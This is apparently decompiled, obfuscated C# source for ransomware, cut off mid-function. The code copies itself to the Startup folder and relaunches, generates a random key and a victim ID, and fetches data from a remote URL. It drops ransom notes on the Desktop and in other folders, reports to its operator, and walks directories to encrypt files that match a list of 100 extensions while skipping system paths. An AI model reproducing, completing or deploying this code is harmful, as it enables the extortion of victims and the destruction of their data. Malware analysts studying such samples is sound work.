										File.AppendAllText(MGkBzYPheHDPb, getString_0(107387046) + CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + getString_0(107387324) + ex12.Message + getString_0(107396286));
									}
									catch (Exception)
									{
									}
								}
								uAQgXZmBeIANml++;
								return;
							}
						}
						if (AcumuDDlRST)
						{
							if (utySFCfMcfJj != getString_0(107387306))
							{
								hfPzCBDyuj(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + utySFCfMcfJj, bytes2);
							}
							else
							{
								hfPzCBDyuj(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, bytes2);
							}
						}
					}
					end_IL_031d_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0a6b;
			IL_0a6b:
			UWBePPalaohE.Remove(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg);
		}

		static VwdjWlzHHKKh()
		{
			Strings.CreateGetStringDelegate(typeof(VwdjWlzHHKKh));
		}
	}

	private sealed class UDbEUcMVPQWY
	{
		public string eltoobQHQxyj;

		public string sIPOkqlVRtqKbWj;

		public void _003CEncrypt2_003Eb__3a()
		{
			while (true)
			{
				try
				{
					File.Delete(eltoobQHQxyj);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__3b()
		{
			while (true)
			{
				try
				{
					if (File.Exists(sIPOkqlVRtqKbWj))
					{
						File.Delete(sIPOkqlVRtqKbWj);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string wUDkdnCGLMOs;

	public static byte[] oybyixAEyQBUaM;

	public static string VIsIdhZRykLqTUQDB;

	public static string xtbYgrRCEXRhIt;

	public static List<string> jwBOsivrxmQ;

	public static List<string> rpxCtxXAXaqO;

	public static string sfTwxMnKqH;

	public static string pPYjMJSGlCKrKN;

	public static string MLaZeafODt;

	public static string OXVbUzKTVitWIr;

	public static string tXzockTHFc;

	public static int HBRweUbQOIMdbZZp;

	public static string hbiMFBxXkVIgur;

	public static string joSdEOhiuznF;

	public static string PqJDLaSNaTyq;

	public static string qPJcttYtoGQxk;

	public static string pHrGJqOZIctkX;

	public static string odoeVPlCXvoFQPOL;

	public static string PaFnRkZFdGu;

	public static string KHZEvaaAjnAHLm;

	public static List<string> tAtyTsIAxbjQvxo;

	public static List<string> CyfMkozTWVl;

	public static string XndNHYXWpvB;

	public static string uLLsUdDbXoEVQ;

	public static string FCVCIbLfbkOUFF;

	public static List<string> ngVLNnblfHHw;

	public static string MvoNMddyflMC;

	private static string mNEuIvkieOf;

	public static string PEOsufOVorqNP;

	public static string BdLuVqHofum;

	public static List<string> malBhCqwsAb;

	public static List<string> fKSEXFuwhxqo;

	public static List<string> sCGElgUFAvuF;

	public static List<string> xeIMBaJAxSsDB;

	public static string ShXoyCWZDyXwi;

	public static List<string> EfmWSoVDSebqevqR;

	public static List<string> fPrxwqfsud;

	public static string qAzXftneDtps;

	public static string HsZkMcTFckYW;

	internal static DateTime xiONLqHaZct;

	internal static DateTime jGXHuOBPPgtKz;

	public static string DuwAfCYTUCT;

	public static string SHZkgBAmdkcxAL;

	public static string bEizJfDhNZQq;

	public static string FGSAPCQYxv;

	public static string OtSMNKJbubH;

	public static string zbgyTsJtDee;

	public static string AogNSkFhtWihX;

	public static string SFDpinVUmMSqKHuE;

	public static List<string> sAdxWTwIriShHsff;

	public static string YzEXDgkVctSKX;

	public static string ljXGZTEjpxSlR;

	public static string yZeWShcxZWoWCA;

	public static string WjKjLyPEIXdw;

	public static string qTQAnNPXefQJG;

	public static string HKveNHqmcCcd;

	public static string FiZbwLuPSlAw;

	public static string cLyvUOjuymTe;

	public static string PXSTfaCtML;

	public static string csYWOlqSSo;

	public static string eVpxYpRfqa;

	public static string TLCzgPMposi;

	public static string ovnANMfJRksfC;

	public static string LNYeQleHVCaotD;

	public static string psvtrVxGuDGR;

	public static string sWLGwUQDDISenWIL;

	public static string djPRdBrPDbwciX;

	public static string kmCxiOJvslMKl;

	public static string JckzaJkTNZBlbcc;

	public static string NnEdFRIdEjUNKn;

	public static string XmxvSLbGDWQx;

	public static string bFDfWKkWoli;

	public static string atVhanzdqXfhb;

	public static string kegyisOKPkiLZ;

	public static string ypzGMFIykfAhE;

	public static string fpFrhBxfnPX;

	public static string QYWNitRbofuBkTAcs;

	public static string pMjcTzqCudiSy;

	public static string ZKhoLenETDJl;

	public static string[] MWvvpEiADk;

	public static string FTilkCJiPZSoYC;

	public static bool rqILzTAnaGs;

	public static string nNKYHJkkrAiE;

	public static bool AcumuDDlRST;

	public static bool LAWnVrdYZglWd;

	public static bool RJKYNoslDCRyE;

	public static bool cYedAGEIfl;

	public static string MGkBzYPheHDPb;

	public static bool VLajbDNhoSbf;

	public static bool RKupSfKdGWcSjGQ;

	public static bool rWsrMDdHFQmC;

	public static bool kwebbXGLWFTcp;

	public static bool qtSCtAyEKwnBa;

	public static string iMvajZNuOYl;

	public static bool RiGciHwEXLcD;

	public static Stopwatch lgTppZwtgUy;

	public static int uAQgXZmBeIANml;

	public static int ywaYFjHsMFpWdbL;

	public static bool vzooNONBAAoJ;

	public static string zwSwCGajjNfu;

	public static string[] DiTjsfekHbbSPJE;

	public static List<string> bopDeifAQZQuf;

	public static int rqDMxhDDSWkTsJ;

	public static bool YAyTMwdzmcgjIt;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegateb;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatee;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatef;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	[NonSerialized]
	internal static GetString getString_0;

	private static void Main(string[] args)
	{
		try
		{
			RiPRfhSjod CS_0024_003C_003E8__locals0 = new RiPRfhSjod();
			CS_0024_003C_003E8__locals0.RUNABRXajzYGN = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.RUNABRXajzYGN) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			IEtQxtIjtPFf.JfxJOinZfPRYlih(mNEuIvkieOf);
		}
		catch (Exception)
		{
		}
		try
		{
			if (fpFrhBxfnPX == getString_0(107396798))
			{
				Thread thread = new Thread(GNsvSzgFLqAp.DzHrOsoPbLsB);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (PqJDLaSNaTyq == getString_0(107396798))
		{
			Thread.Sleep(int.Parse(qPJcttYtoGQxk));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && AogNSkFhtWihX == getString_0(107396798))
		{
			try
			{
				uqSghrqYUYbs(RdzltCKTqMftoSE(getString_0(107396793)));
			}
			catch
			{
			}
		}
		try
		{
			if (PaFnRkZFdGu == getString_0(107396798) && WdbEIPKwJkwQX.OszHXcHpgQu())
			{
				new IqvwXxhcozFA().EcOQQOepVyYZK(bool_0: false);
				WdbEIPKwJkwQX.bPMXvvQudIoS();
			}
		}
		catch (Exception)
		{
		}
		if (uLLsUdDbXoEVQ == getString_0(107396798) && WdbEIPKwJkwQX.OszHXcHpgQu())
		{
			new IqvwXxhcozFA().EcOQQOepVyYZK(bool_0: false);
			new IqvwXxhcozFA().IzzjMTsgYInhh();
		}
		if (joSdEOhiuznF == getString_0(107396798))
		{
			QSdyqCaXmUc.gWVahPxCjjMiPo();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107397200);
			string text2 = text + Path.GetFileName(fileName);
			if (tXzockTHFc == getString_0(107396798) && fileName != text2)
			{
				Thread thread2 = new Thread(KhgTjITMBeirBL);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (sfTwxMnKqH == getString_0(107396798) && mainModule != null && fileName != text2)
			{
				try
				{
					HBRweUbQOIMdbZZp = lDDZeXluxlaaCs(0, tAtyTsIAxbjQvxo.Count);
					File.Copy(fileName, text + tAtyTsIAxbjQvxo[HBRweUbQOIMdbZZp], overwrite: true);
					Process.Start(text + tAtyTsIAxbjQvxo[HBRweUbQOIMdbZZp]);
					yuTzVjQdrCIsBY();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (qAzXftneDtps == getString_0(107396798) && DateTime.Now < xiONLqHaZct)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (HsZkMcTFckYW == getString_0(107396798) && DateTime.Now > jGXHuOBPPgtKz)
			{
				yuTzVjQdrCIsBY();
			}
		}
		catch
		{
		}
		qClNtAbWJO();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegateb == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegateb = delegate
			{
				List<string> source = fKSEXFuwhxqo;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate(string string_0)
					{
						AWnjIktergta(RdzltCKTqMftoSE(getString_0(107386710)), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
				List<string> source2 = sCGElgUFAvuF;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
					{
						AWnjIktergta(RdzltCKTqMftoSE(getString_0(107386729)), string_0);
					};
				}
				Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
				if (ZKhoLenETDJl == getString_0(107396798))
				{
					string[] mWvvpEiADk = MWvvpEiADk;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
						{
							AWnjIktergta(RdzltCKTqMftoSE(getString_0(107386729)), getString_0(107386672) + string_0 + getString_0(107386695));
						};
					}
					Parallel.ForEach(mWvvpEiADk, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
				}
				if (!NRobqXdjvopcwE().Contains(getString_0(107387407)))
				{
					iUUVXROQaGoEty(ShXoyCWZDyXwi);
				}
				else
				{
					List<string> source3 = xeIMBaJAxSsDB;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
						{
							AWnjIktergta(RdzltCKTqMftoSE(uWwQTdHjjsAYSYp(getString_0(107386690))), string_0);
						};
					}
					Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				}
				List<string> efmWSoVDSebqevqR = EfmWSoVDSebqevqR;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
					{
						AWnjIktergta(RdzltCKTqMftoSE(getString_0(107386665)), string_0);
					};
				}
				Parallel.ForEach(efmWSoVDSebqevqR, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegateb);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397227))))
			{
				string[] array = File.ReadAllLines(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397227)));
				string[] array2 = array;
				foreach (string text3 in array2)
				{
					if (text3.Contains(getString_0(107397178)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4))
						{
							string[] array3 = text4.Split(new char[1] { ',' });
							foreach (string text5 in array3)
							{
								string text6 = text5.Trim();
								if (Directory.Exists(text6) && !jwBOsivrxmQ.Contains(text6) && text6 != getString_0(107397189) && text6 != getString_0(107397136) && text6 != getString_0(107397115))
								{
									jwBOsivrxmQ.Add(text6);
								}
							}
						}
					}
					if (text3.Contains(getString_0(107397086)))
					{
						string text7 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text7) && text7.ToLower() == getString_0(107397073))
						{
							ovnANMfJRksfC = getString_0(107396798);
						}
						else if (!string.IsNullOrEmpty(text7) && text7.ToLower() == getString_0(107397096))
						{
							ovnANMfJRksfC = getString_0(107397087);
						}
					}
					if (text3.Contains(getString_0(107397050)))
					{
						string text8 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text8) && text8.ToLower() == getString_0(107397073))
						{
							RiGciHwEXLcD = true;
						}
						else if (!string.IsNullOrEmpty(text8) && text8.ToLower() == getString_0(107397096))
						{
							RiGciHwEXLcD = false;
						}
					}
					if (text3.Contains(getString_0(107397065)))
					{
						string text9 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text9) && text9.ToLower() == getString_0(107397073))
						{
							VLajbDNhoSbf = true;
						}
						else if (!string.IsNullOrEmpty(text9) && text9.ToLower() == getString_0(107397096))
						{
							VLajbDNhoSbf = false;
						}
					}
					if (text3.Contains(getString_0(107397020)))
					{
						string text10 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text10) && text10.ToLower() == getString_0(107397073))
						{
							YAyTMwdzmcgjIt = true;
						}
						else if (!string.IsNullOrEmpty(text10) && text10.ToLower() == getString_0(107397096))
						{
							YAyTMwdzmcgjIt = false;
						}
					}
				}
			}
		}
		catch (Exception ex6)
		{
			if (VLajbDNhoSbf)
			{
				try
				{
					File.AppendAllText(MGkBzYPheHDPb, getString_0(107397023) + ex6.Message);
				}
				catch (Exception)
				{
				}
			}
		}
		if (ovnANMfJRksfC == getString_0(107397087))
		{
			HKRhfInFyEzhKfN();
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && RJKYNoslDCRyE)
			{
				try
				{
					Thread thread4 = new Thread(EcAxyFJmHllOi.jiNXctNQGFMisY);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			AWnjIktergta(getString_0(107396434), RdzltCKTqMftoSE(getString_0(107396453)));
		}
		SecureString secureString = new SecureString();
		if (bEizJfDhNZQq == getString_0(107397087))
		{
			pPYjMJSGlCKrKN = NtziTGPOOPUxYBAz.zEQGtyDgSaEtAI(32);
			MLaZeafODt = NtziTGPOOPUxYBAz.FPMzCARIEhq();
		}
		else
		{
			pPYjMJSGlCKrKN = getString_0(107396348);
		}
		OXVbUzKTVitWIr = CEfwFkxuuHuowy.CfhzgVmlFFzI(pPYjMJSGlCKrKN + MLaZeafODt);
		if (rWsrMDdHFQmC)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), iMvajZNuOYl)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), iMvajZNuOYl), string.Concat(RdzltCKTqMftoSE(getString_0(107396303)), new WebClient().DownloadString(RdzltCKTqMftoSE(getString_0(107396278))), getString_0(107396269), RdzltCKTqMftoSE(getString_0(107396264)), DateTime.Now, getString_0(107396269), RdzltCKTqMftoSE(getString_0(107396223)), OXVbUzKTVitWIr));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), iMvajZNuOYl), getString_0(107396678) + OXVbUzKTVitWIr);
				}
			}
			catch (Exception ex9)
			{
				if (VLajbDNhoSbf)
				{
					try
					{
						File.AppendAllText(MGkBzYPheHDPb, getString_0(107396649) + ex9.Message + getString_0(107396269));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		WulyYghiytqOT.EVSjQtxoyp(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), NnEdFRIdEjUNKn), DVTewTbLBZWx(OXVbUzKTVitWIr), null, null, getString_0(107396568), getString_0(107396583), null);
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			QXShVCvsvkRrTmR();
		}
		try
		{
			try
			{
				if (RiGciHwEXLcD)
				{
					Console.WriteLine(getString_0(107396534));
				}
			}
			catch
			{
			}
			bLbTvukAtwM(new string[1] { getString_0(107396517) }, new string[100]
			{
				getString_0(107396476),
				getString_0(107396471),
				getString_0(107396466),
				getString_0(107396489),
				getString_0(107396484),
				getString_0(107396479),
				getString_0(107395930),
				getString_0(107395925),
				getString_0(107395920),
				getString_0(107395947),
				getString_0(107395942),
				getString_0(107395937),
				getString_0(107395896),
				getString_0(107395891),
				getString_0(107395914),
				getString_0(107395909),
				getString_0(107395904),
				getString_0(107395867),
				getString_0(107395862),
				getString_0(107395857),
				getString_0(107395880),
				getString_0(107395875),
				getString_0(107395838),
				getString_0(107395833),
				getString_0(107395828),
				getString_0(107395823),
				getString_0(107395850),
				getString_0(107395845),
				getString_0(107395840),
				getString_0(107395803),
				getString_0(107395798),
				getString_0(107395793),
				getString_0(107395820),
				getString_0(107395815),
				getString_0(107395774),
				getString_0(107395769),
				getString_0(107395764),
				getString_0(107395759),
				getString_0(107395930),
				getString_0(107395786),
				getString_0(107395920),
				getString_0(107395777),
				getString_0(107395740),
				getString_0(107395735),
				getString_0(107395730),
				getString_0(107395757),
				getString_0(107395752),
				getString_0(107395747),
				getString_0(107395710),
				getString_0(107395705),
				getString_0(107395700),
				getString_0(107395695),
				getString_0(107395722),
				getString_0(107395717),
				getString_0(107395712),
				getString_0(107396187),
				getString_0(107396182),
				getString_0(107396177),
				getString_0(107396200),
				getString_0(107396195),
				getString_0(107396154),
				getString_0(107396173),
				getString_0(107395786),
				getString_0(107396160),
				getString_0(107396119),
				getString_0(107396142),
				getString_0(107396133),
				getString_0(107396092),
				getString_0(107396083),
				getString_0(107396110),
				getString_0(107396101),
				getString_0(107396060),
				getString_0(107396051),
				getString_0(107396078),
				getString_0(107396073),
				getString_0(107396068),
				getString_0(107396063),
				getString_0(107396026),
				getString_0(107396021),
				getString_0(107396044),
				getString_0(107396039),
				getString_0(107396034),
				getString_0(107395997),
				getString_0(107395992),
				getString_0(107395987),
				getString_0(107396010),
				getString_0(107396001),
				getString_0(107395964),
				getString_0(107395820),
				getString_0(107395959),
				getString_0(107395954),
				getString_0(107395981),
				getString_0(107395976),
				getString_0(107395971),
				getString_0(107395418),
				getString_0(107395413),
				getString_0(107395408),
				getString_0(107395431),
				getString_0(107395426),
				getString_0(107395389)
			}, new string[0], pPYjMJSGlCKrKN, getString_0(107395384));
		}
		catch (Exception ex11)
		{
			if (VLajbDNhoSbf)
			{
				try
				{
					File.AppendAllText(MGkBzYPheHDPb, getString_0(107395399) + ex11.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395374)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395374));
				streamWriter.WriteLine(RdzltCKTqMftoSE(getString_0(107395341)));
				streamWriter.WriteLine(getString_0(107396269));
				streamWriter.WriteLine(RdzltCKTqMftoSE(getString_0(107393363)));
				streamWriter.WriteLine(OXVbUzKTVitWIr);
				if (PEOsufOVorqNP == getString_0(107397087))
				{
					streamWriter.WriteLine(getString_0(107396269));
					streamWriter.WriteLine(RdzltCKTqMftoSE(getString_0(107393330)) + Convert.ToString(ngVLNnblfHHw.Count));
				}
				if (vzooNONBAAoJ)
				{
					streamWriter.WriteLine(getString_0(107396269));
					streamWriter.WriteLine(RdzltCKTqMftoSE(getString_0(107393285)));
					streamWriter.WriteLine(ohJtITMsrrTaVTo.NQaWQkkkRgsXVC());
				}
			}
			else
			{
				string text11 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395374));
				if (!text11.Contains(OXVbUzKTVitWIr) && !AcumuDDlRST)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395374), getString_0(107393252) + OXVbUzKTVitWIr);
				}
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in CyfMkozTWVl)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107395374)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395374), item + getString_0(107395374), overwrite: true);
				}
				else
				{
					string text12 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395374));
					if (!text12.Contains(OXVbUzKTVitWIr) && !AcumuDDlRST)
					{
						File.AppendAllText(item + getString_0(107395374), getString_0(107393252) + OXVbUzKTVitWIr);
					}
				}
			}
			catch (Exception)
			{
			}
			if (!cYedAGEIfl && num > 10)
			{
				break;
			}
		}
		if (atVhanzdqXfhb == getString_0(107396798))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393223)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393223));
					streamWriter2.WriteLine(RdzltCKTqMftoSE(getString_0(107393190)));
					streamWriter2.WriteLine(getString_0(107396269));
					streamWriter2.WriteLine(RdzltCKTqMftoSE(getString_0(107390012)));
					streamWriter2.WriteLine(OXVbUzKTVitWIr + RdzltCKTqMftoSE(getString_0(107389955)));
					if (PEOsufOVorqNP == getString_0(107397087))
					{
						streamWriter2.WriteLine(getString_0(107396269));
						streamWriter2.WriteLine(RdzltCKTqMftoSE(getString_0(107389910)) + RdzltCKTqMftoSE(getString_0(107393330)) + Convert.ToString(ngVLNnblfHHw.Count) + RdzltCKTqMftoSE(getString_0(107389955)));
					}
					if (vzooNONBAAoJ)
					{
						streamWriter2.WriteLine(getString_0(107396269));
						streamWriter2.WriteLine(RdzltCKTqMftoSE(getString_0(107393285)));
						streamWriter2.WriteLine(ohJtITMsrrTaVTo.NQaWQkkkRgsXVC());
					}
				}
				else
				{
					string text13 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395374));
					if (!text13.Contains(OXVbUzKTVitWIr) && !AcumuDDlRST)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393223), RdzltCKTqMftoSE(getString_0(107389910)) + getString_0(107393252) + OXVbUzKTVitWIr + RdzltCKTqMftoSE(getString_0(107389955)));
					}
				}
			}
			catch
			{
			}
		}
		if (MvoNMddyflMC == getString_0(107396798))
		{
			try
			{
				if (PEOsufOVorqNP == getString_0(107397087))
				{
					ohJtITMsrrTaVTo.nZMwqWMjRzu(getString_0(107389849), getString_0(107389844), getString_0(107389863), string.Concat(RdzltCKTqMftoSE(getString_0(107396303)), new WebClient().DownloadString(RdzltCKTqMftoSE(getString_0(107396278))), getString_0(107389822), RdzltCKTqMftoSE(getString_0(107396264)), DateTime.Now, getString_0(107396269), RdzltCKTqMftoSE(getString_0(107389817)), Convert.ToString(ngVLNnblfHHw.Count), getString_0(107396269), RdzltCKTqMftoSE(getString_0(107396223)), OXVbUzKTVitWIr));
				}
				else
				{
					ohJtITMsrrTaVTo.nZMwqWMjRzu(getString_0(107389849), getString_0(107389844), getString_0(107389863), string.Concat(RdzltCKTqMftoSE(getString_0(107396303)), new WebClient().DownloadString(RdzltCKTqMftoSE(getString_0(107396278))), getString_0(107389822), RdzltCKTqMftoSE(getString_0(107396264)), DateTime.Now, getString_0(107396269), RdzltCKTqMftoSE(getString_0(107389817)), Convert.ToString(ngVLNnblfHHw.Count), getString_0(107396269), RdzltCKTqMftoSE(getString_0(107396223)), OXVbUzKTVitWIr));
				}
			}
			catch
			{
			}
		}
		if (KHZEvaaAjnAHLm == getString_0(107396798))
		{
			try
			{
				rtcTNtnEkpLCCQO.cfJMVrhEYUsE(new Uri(getString_0(107389288)));
			}
			catch
			{
			}
		}
		if (atVhanzdqXfhb == getString_0(107397087))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395374)))
				{
					Process.Start(RdzltCKTqMftoSE(getString_0(107389287)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395374));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393223)))
				{
					Process.Start(RdzltCKTqMftoSE(getString_0(107389262)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393223));
				}
			}
			catch
			{
			}
		}
		if (!string.IsNullOrEmpty(HKveNHqmcCcd))
		{
			try
			{
				File.Delete(HKveNHqmcCcd);
			}
			catch
			{
			}
		}
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397227))))
			{
				File.Delete(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397227)));
			}
		}
		catch (Exception ex14)
		{
			try
			{
				File.AppendAllText(MGkBzYPheHDPb, getString_0(107389213) + ex14.Message);
			}
			catch (Exception)
			{
			}
		}
		if (VLajbDNhoSbf)
		{
			try
			{
				File.AppendAllText(MGkBzYPheHDPb, getString_0(107389168));
			}
			catch (Exception)
			{
			}
		}
		if (wUDkdnCGLMOs == getString_0(107389187))
		{
			yuTzVjQdrCIsBY();
		}
	}

	public static void KhgTjITMBeirBL()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(RdzltCKTqMftoSE(getString_0(107389146)), RdzltCKTqMftoSE(getString_0(107389536)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int lDDZeXluxlaaCs(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> UJWemBgyHUdQl(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains(getString_0(107389507)) && !text.Contains(getString_0(107389482)) && !text.Contains(getString_0(107389449)) && !text.ToLower().Contains(getString_0(107389400)) && !text.ToLower().Contains(getString_0(107389419)) && !text.Contains(getString_0(107389362)) && !text.Contains(getString_0(107389341)) && !text.ToLower().Contains(getString_0(107389328)) && !text.ToLower().Contains(getString_0(107389347)) && !text.ToLower().Contains(getString_0(107388766)) && !text.ToLower().Contains(getString_0(107388757)) && !text.ToLower().Contains(getString_0(107388772)) && !text.ToLower().Contains(getString_0(107388727)) && !text.ToLower().Contains(getString_0(107388746)) && !text.ToLower().Contains(getString_0(107388693)))
				{
					array = Directory.GetFiles(text);
					goto IL_01f1;
				}
			}
			catch
			{
			}
			continue;
			IL_01f1:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107388668)) && !fileInfo.FullName.Contains(getString_0(107388683)) && !fileInfo.FullName.Contains(getString_0(107388634)) && !fileInfo.FullName.Contains(getString_0(107388649)) && !fileInfo.FullName.Contains(getString_0(107388600)) && !fileInfo.FullName.Contains(getString_0(107388615)) && !fileInfo.FullName.Contains(getString_0(107388566)) && !fileInfo.FullName.Contains(getString_0(107388581)) && !fileInfo.FullName.Contains(getString_0(107388536)) && !fileInfo.FullName.Contains(getString_0(107388547)) && !fileInfo.FullName.ToLower().Contains(getString_0(107389014)) && !fileInfo.FullName.ToLower().Contains(getString_0(107389033)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388984)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388999)) && !fileInfo.FullName.Contains(RdzltCKTqMftoSE(getString_0(107388950))) && !fileInfo.FullName.Contains(getString_0(107388925)) && !fileInfo.FullName.Contains(getString_0(107397227)) && !fileInfo.FullName.Contains(getString_0(107388912)) && !fileInfo.FullName.EndsWith(getString_0(107395384)) && !fileInfo.FullName.EndsWith(getString_0(107388887)) && !fileInfo.FullName.EndsWith(getString_0(107388882)) && !fileInfo.FullName.EndsWith(getString_0(107388909)) && !fileInfo.FullName.EndsWith(getString_0(107388904)) && !fileInfo.FullName.Contains(getString_0(107388899)) && !fileInfo.FullName.Contains(NnEdFRIdEjUNKn) && !fileInfo.FullName.Contains(MGkBzYPheHDPb) && !fileInfo.FullName.Contains(iMvajZNuOYl))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(xtbYgrRCEXRhIt) * 1024.0 * 1024.0 && VIsIdhZRykLqTUQDB == getString_0(107396798))
						{
							list.Add(fileInfo.FullName);
							HOlhBPnTtrjV(list, string_1, string_2, string_3, string_4);
